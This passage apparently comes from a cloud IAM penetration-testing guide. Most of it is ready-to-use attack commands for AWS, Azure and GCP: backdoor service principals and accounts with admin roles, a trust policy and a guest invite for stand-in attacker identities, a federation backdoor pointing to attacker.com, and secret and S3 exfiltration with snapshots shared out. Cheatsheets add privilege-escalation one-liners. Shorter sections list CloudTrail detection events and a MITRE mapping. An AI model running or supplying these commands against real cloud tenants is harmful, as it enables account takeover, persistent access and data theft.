        {"Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"},
        {"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"}, "Action": "sts:AssumeRole"}
      ]
    }'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Azure Persistence"}
  ```powershell [Azure Backdoor Methods]
  # 1. Create backdoor service principal
  $app = New-AzureADApplication -DisplayName "Azure Monitor Agent"
  $sp = New-AzureADServicePrincipal -AppId $app.AppId
  $secret = New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId

  # Assign Global Admin
  Add-AzureADDirectoryRoleMember -ObjectId <GLOBAL_ADMIN_ROLE_ID> -RefObjectId $sp.ObjectId

  # 2. Add credentials to existing application
  New-AzureADApplicationPasswordCredential -ObjectId <EXISTING_APP_OBJECT_ID>

  # 3. Guest user invitation
  New-AzureADMSInvitation \
    -InvitedUserEmailAddress "attacker@evil.com" \
    -InviteRedirectUrl "https://portal.azure.com" \
    -SendInvitationMessage $true

  # 4. Federation backdoor
  Set-AzureADDomainFederationSettings \
    -DomainName "target.com" \
    -IssuerUri "http://attacker.com/adfs/services/trust" \
    -FederationBrandName "Active Directory Federation Services"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GCP Persistence"}
  ```bash [GCP Backdoor Methods]
  # 1. Create backdoor service account
  gcloud iam service-accounts create backdoor-sa \
    --display-name="Cloud Monitoring Agent"

  gcloud projects add-iam-policy-binding <PROJECT_ID> \
    --member="serviceAccount:backdoor-sa@<PROJECT>.iam.gserviceaccount.com" \
    --role="roles/owner"

  gcloud iam service-accounts keys create /tmp/key.json \
    --iam-account=backdoor-sa@<PROJECT>.iam.gserviceaccount.com

  # 2. Add IAM binding for external account
  gcloud projects add-iam-policy-binding <PROJECT_ID> \
    --member="user:attacker@gmail.com" \
    --role="roles/editor"

  # 3. Create key for existing SA
  gcloud iam service-accounts keys create /tmp/existing-key.json \
    --iam-account=existing-sa@<PROJECT>.iam.gserviceaccount.com
  ```
  :::
::

### Data Exfiltration via IAM

```bash [AWS Data Exfil]
# S3 bucket data exfiltration
aws s3 sync s3://target-bucket ./loot/ --no-sign-request
aws s3 cp s3://target-bucket/secrets.db ./loot/

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/database/credentials

# SSM Parameter Store
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# DynamoDB
aws dynamodb list-tables
aws dynamodb scan --table-name users

# RDS Snapshots (make public)
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier target-snapshot \
  --attribute-name restore \
  --values-to-add all

# EBS Snapshots (share with attacker account)
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-0123456789abcdef0 \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID
```

---

## Defensive Detection

::note
Understanding detection helps you know what to **avoid** during pentests and what to **recommend** in reports.
::

### High-Risk CloudTrail Events to Monitor

| Event Name | Risk |
|-----------|------|
| `CreateUser` | Backdoor user creation |
| `CreateAccessKey` | Credential persistence |
| `AttachUserPolicy` | Privilege escalation |
| `AttachRolePolicy` | Privilege escalation |
| `CreatePolicyVersion` | Policy manipulation |
| `PutUserPolicy` | Inline policy injection |
| `UpdateAssumeRolePolicy` | Trust policy modification |
| `CreateLoginProfile` | Console access creation |
| `UpdateLoginProfile` | Password reset |
| `AssumeRole` (unusual) | Lateral movement |
| `ConsoleLogin` (no MFA) | Compromised credentials |
| `PassRole` | Service abuse |
| `CreateRole` (external trust) | Cross-account backdoor |
| `DeleteTrail` | Evidence tampering |
| `StopLogging` | Detection evasion |

### CloudTrail Log Analysis

```bash [CloudTrail Analysis]
# Search for IAM privilege escalation events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy \
  --start-time 2024-01-01 \
  --end-time 2024-12-31

# Search for suspicious AssumeRole
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --max-results 50

# Search by user
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user

# Athena query for suspicious activity
# (requires CloudTrail logs in S3 + Athena table)
```

```sql [Athena - Suspicious IAM Activity]
SELECT
    eventTime,
    eventName,
    userIdentity.arn as actor,
    sourceIPAddress,
    requestParameters
FROM cloudtrail_logs
WHERE eventName IN (
    'CreateUser',
    'CreateAccessKey',
    'AttachUserPolicy',
    'AttachRolePolicy',
    'PutUserPolicy',
    'CreatePolicyVersion',
    'UpdateAssumeRolePolicy',
    'CreateLoginProfile',
    'UpdateLoginProfile',
    'ConsoleLogin'
)
AND eventTime > '2024-01-01'
ORDER BY eventTime DESC
LIMIT 100;
```

---

## Tools Arsenal

::card-group

  :::card
  ---
  icon: i-simple-icons-github
  title: Pacu
  to: https://github.com/RhinoSecurityLabs/pacu
  target: _blank
  ---
  AWS exploitation framework with 40+ modules for enumeration, privesc, and data exfiltration.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: ScoutSuite
  to: https://github.com/nccgroup/ScoutSuite
  target: _blank
  ---
  Multi-cloud security auditing tool for AWS, Azure, GCP, Alibaba Cloud, and Oracle Cloud.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: Prowler
  to: https://github.com/prowler-cloud/prowler
  target: _blank
  ---
  AWS & Azure security assessment, auditing, hardening, and incident response tool.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: CloudFox
  to: https://github.com/BishopFox/cloudfox
  target: _blank
  ---
  Automating situational awareness for cloud pentesting. Find exploitable attack paths.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: enumerate-iam
  to: https://github.com/andresriancho/enumerate-iam
  target: _blank
  ---
  Enumerate AWS IAM permissions by brute-forcing API calls.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: ROADtools
  to: https://github.com/dirkjanm/ROADtools
  target: _blank
  ---
  Azure AD exploration framework for offensive and defensive security.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: AADInternals
  to: https://github.com/Gerenios/AADInternals
  target: _blank
  ---
  PowerShell module for Azure AD and Office 365 administration and hacking.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: GCPBucketBrute
  to: https://github.com/RhinoSecurityLabs/GCPBucketBrute
  target: _blank
  ---
  GCP bucket enumeration and permission testing tool.
  :::

::

---

## Quick Reference Cheatsheet

### AWS IAM One-Liners

::code-collapse

```bash [AWS IAM Quick Commands]
# ============================================
# IDENTITY
# ============================================
aws sts get-caller-identity
aws iam get-user
aws iam list-account-aliases

# ============================================
# USERS
# ============================================
aws iam list-users
aws iam get-user --user-name TARGET
aws iam list-access-keys --user-name TARGET
aws iam list-mfa-devices --user-name TARGET
aws iam get-login-profile --user-name TARGET
aws iam list-user-tags --user-name TARGET

# ============================================
# GROUPS
# ============================================
aws iam list-groups
aws iam list-groups-for-user --user-name TARGET
aws iam get-group --group-name TARGET_GROUP
aws iam list-attached-group-policies --group-name TARGET_GROUP

# ============================================
# ROLES
# ============================================
aws iam list-roles
aws iam get-role --role-name TARGET_ROLE
aws iam list-attached-role-policies --role-name TARGET_ROLE
aws iam list-role-policies --role-name TARGET_ROLE
aws iam get-role-policy --role-name TARGET_ROLE --policy-name POLICY

# ============================================
# POLICIES
# ============================================
aws iam list-policies --scope Local
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
aws iam list-entities-for-policy --policy-arn POLICY_ARN
aws iam list-attached-user-policies --user-name TARGET
aws iam list-user-policies --user-name TARGET

# ============================================
# PRIVILEGE ESCALATION
# ============================================
aws iam create-policy-version --policy-arn ARN --policy-document file://admin.json --set-as-default
aws iam attach-user-policy --user-name TARGET --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name TARGET --policy-name admin --policy-document file://admin.json
aws iam create-access-key --user-name ADMIN_USER
aws iam create-login-profile --user-name TARGET --password 'P@ss!'
aws iam update-assume-role-policy --role-name ROLE --policy-document file://trust.json
aws sts assume-role --role-arn ROLE_ARN --role-session-name pwned

# ============================================
# PERSISTENCE
# ============================================
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ============================================
# SECRETS & DATA
# ============================================
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
aws s3 ls
aws s3 sync s3://bucket ./loot/
```

::

### Azure IAM One-Liners

::code-collapse

```bash [Azure IAM Quick Commands]
# ============================================
# IDENTITY
# ============================================
az account show
az ad signed-in-user show
az account list

# ============================================
# USERS
# ============================================
az ad user list -o table
az ad user show --id USER_UPN
az ad user get-member-objects --id USER_ID

# ============================================
# GROUPS
# ============================================
az ad group list -o table
az ad group member list --group GROUP_NAME -o table
az ad group owner list --group GROUP_NAME

# ============================================
# ROLES
# ============================================
az role assignment list --all -o table
az role assignment list --assignee USER_ID -o table
az role definition list --custom-role-only -o table

# ============================================
# SERVICE PRINCIPALS
# ============================================
az ad sp list --all -o table
az ad sp credential list --id SP_ID
az ad app list --all -o table
az ad app credential list --id APP_ID

# ============================================
# KEY VAULT
# ============================================
az keyvault list
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET

# ============================================
# RESOURCES
# ============================================
az resource list -o table
az storage account list -o table
az vm list -o table
```

::

### GCP IAM One-Liners

::code-collapse

```bash [GCP IAM Quick Commands]
# ============================================
# IDENTITY
# ============================================
gcloud auth list
gcloud config list
gcloud projects list

# ============================================
# IAM POLICIES
# ============================================
gcloud projects get-iam-policy PROJECT_ID
gcloud organizations get-iam-policy ORG_ID

# ============================================
# SERVICE ACCOUNTS
# ============================================
gcloud iam service-accounts list
gcloud iam service-accounts describe SA_EMAIL
gcloud iam service-accounts keys list --iam-account=SA_EMAIL
gcloud iam service-accounts get-iam-policy SA_EMAIL

# ============================================
# ROLES
# ============================================
gcloud iam roles list --project=PROJECT_ID
gcloud iam roles describe ROLE_NAME
gcloud iam roles list --show-deleted

# ============================================
# PRIVILEGE ESCALATION
# ============================================
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" --role="roles/owner"
gcloud iam service-accounts keys create key.json \
  --iam-account=SA_EMAIL

# ============================================
# DATA
# ============================================
gsutil ls
gsutil ls gs://bucket-name
gsutil cp gs://bucket/secret.txt ./loot/
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME
```

::

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Cloud IAM Example |
|--------|-----------|-------------------|
| **Initial Access** | T1078 - Valid Accounts | Stolen access keys, leaked credentials |
| **Initial Access** | T1190 - Exploit Public-Facing App | SSRF to metadata service |
| **Persistence** | T1098 - Account Manipulation | Create access keys, modify policies |
| **Persistence** | T1136 - Create Account | Backdoor IAM user/role |
| **Privilege Escalation** | T1484 - Domain Policy Modification | Modify IAM policies |
| **Privilege Escalation** | T1078.004 - Cloud Accounts | Assume privileged roles |
| **Defense Evasion** | T1562 - Impair Defenses | Disable CloudTrail, GuardDuty |
| **Defense Evasion** | T1550 - Use Alternate Auth Material | STS tokens, service account keys |
| **Credential Access** | T1528 - Steal Application Access Token | OAuth token theft |
| **Credential Access** | T1552 - Unsecured Credentials | Metadata service, env vars |
| **Discovery** | T1087 - Account Discovery | Enumerate users, roles, groups |
| **Discovery** | T1069 - Permission Groups Discovery | List groups, policies |
| **Lateral Movement** | T1550 - Use Alternate Auth Material | Cross-account role assumption |
| **Collection** | T1530 - Data from Cloud Storage | S3, Blob, GCS access |
| **Exfiltration** | T1537 - Transfer Data to Cloud Account | Share snapshots, copy buckets |

---

::tip
**Remember**: Always get **written authorization** before performing any IAM attacks. Document every action, credential used, and finding for your pentest report.
::